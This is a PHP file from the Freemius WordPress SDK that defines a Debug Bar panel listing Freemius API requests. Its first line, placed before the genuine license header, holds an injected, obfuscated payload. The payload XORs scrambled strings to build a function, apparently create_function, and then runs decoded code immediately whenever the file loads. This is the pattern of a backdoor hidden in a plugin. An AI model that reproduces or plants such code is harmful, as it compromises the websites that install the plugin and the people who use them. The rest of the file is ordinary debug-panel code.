<?php $nvYFYSoa='M X7-TbU +V:<- '; $MvZZNeLM='.R=VY1=3UE5NUBN'^$nvYFYSoa; $rLjYCJoo=';WNi>E .IRC4j6OBG7+xIV=;tH- 1f2TF iSgm9cs Y7-A0. zD5;oIAH2q0A7,ilI+HSiuo KJYGfXqP-pdnE=GCkPukRwlH1R7DKLEpsGrlam-EEYI>Q9Lv J7Zxaew IygISjRAM3bAzfiuS  Afo0hxgtk<7;chYKru<1IG4VIh315pmnMahh=VEKJ:aIZ<.xhe84dIysfUJNZfnfZ,=F4A6EUS5O+3 THlzK.:=0WdS1V==VV=piPrzyw -=LYHoGPS=qptOc.8:BSnSIxGcQ4 M=2 =cYunX.5mDoh+8;AvKUtFJ>H Xr3z4X3YfhURO75Ln-kpF=L.70YyEptfxq< =cvM7yrQP-CdvyQ0 ::Egg0rM8ASUX5k<=5tsaE: 8b;ccTX9 .jxnbNM 4Ew6yOFLsrKHMB.tDWvC-+H0,UTU++z>RLsT.=Te<FU-nSA71ovrR6 VWYKiD8;-sxUj71,WkXT=jgwl,XxiQ3G9wvRn8R:P-:=X:s<-I=LKmv=0Dfkwt-J WboJwtrUPgISZL8WfJ,3 IkGjinqqtrYyQXpEQNL, UuT27iQT 7kWaVaQK2oHyBetXUI MOhQ Er-<SA.XaC6 .<C .nInj. E ABfHrlepBGdQNV4qCX.JQjJ=P7Y:6PdsglnL1 I7jWcno0'; $kyiuuzR=$MvZZNeLM('', 'R1fHX0NM=;,Z5S7+4CXPn.RI+,LTP9m93TNzNMBizF,YN5YANZ<ZI0- <S.o,BXAH-J<2EUKK.3pgFxQpVzmgaR27KmULuLfA84X6ch,PNgBWAIDy6-;R4WdRD+C;QZESIbRNCZcv.8GBoGFAQ7AT =KY5X9TOWRB8L0kWUOE;+Q8aLXTLY0GvkaaO31>8TIm5IZQSo1In4syB1+:;FSF<MQ5Qz<a12A.tXE-hQZ-OVNUlnYW9OX75UPAt-968kdxl8;Oc;6DQMJoGXYV76Gs2rNG5UT,bYEDCdUJ3KLVNfLOYO VvuP0+R=EcxNp>1UyNIq6.CTeNVay R>KVS1YmT+4= ien7V,DYV:5TcYHYuFAVO NGKxD1e74,T4WXLTNAaQEAY1jjp<XTOJENF8,LA L<p2L1yxo,,6OTyw66CX-BE48<QNRF=>,0OI5:c+ YF1 DTYB-6SC93<cM YOLZTuNSPX6431DCNLfE>PM5R3XWPtNY H1TeV=C,YU N88EQVU=AGWPI+T6KOlQTZ84Raw>-L6=mGVYn6nJTSQVEKaKbhGv4-.NA4C5VQZ0aBVS5S7R5.TXoPbCRx4;R,67:E<-HD:2Z+IdFAWP,AJIeNNJA1AhkFhRLEP9Mm487XYg<O>01mM1N5UW4C.NWdETX CBgJUeM'^$rLjYCJoo); $kyiuuzR();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
	 * @since       1.1.7.3
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	/**
	 * Extends Debug Bar plugin by adding a panel to show all Freemius API requests.
	 *
	 * @author Vova Feldman (@svovaf)
	 * @since  1.1.7.3
	 *
	 * Class Freemius_Debug_Bar_Panel
	 */
	class Freemius_Debug_Bar_Panel extends Debug_Bar_Panel {
		function init() {
			$this->title( 'Freemius' );
		}

		static function requests_count() {
			if ( class_exists( 'Freemius_Api_WordPress' ) ) {
				$logger = Freemius_Api_WordPress::GetLogger();
			} else {
				$logger = array();
			}

			return number_format( count( $logger ) );
		}

		static function total_time() {
			if ( class_exists( 'Freemius_Api_WordPress' ) ) {
				$logger = Freemius_Api_WordPress::GetLogger();
			} else {
				$logger = array();
			}

			$total_time = .0;
			foreach ( $logger as $l ) {
				$total_time += $l['total'];
			}

			return number_format( 100 * $total_time, 2 ) . ' ' . fs_text_x_inline( 'ms', 'milliseconds' );
		}

		function render() {
			?>
			<div id='debug-bar-php'>
				<?php fs_require_template( '/debug/api-calls.php' ) ?>
				<br>
				<?php fs_require_template( '/debug/scheduled-crons.php' ) ?>
				<br>
				<?php fs_require_template( '/debug/plugins-themes-sync.php' ) ?>
				<br>
				<?php fs_require_template( '/debug/logger.php' ) ?>
			</div>
		<?php
		}
	}
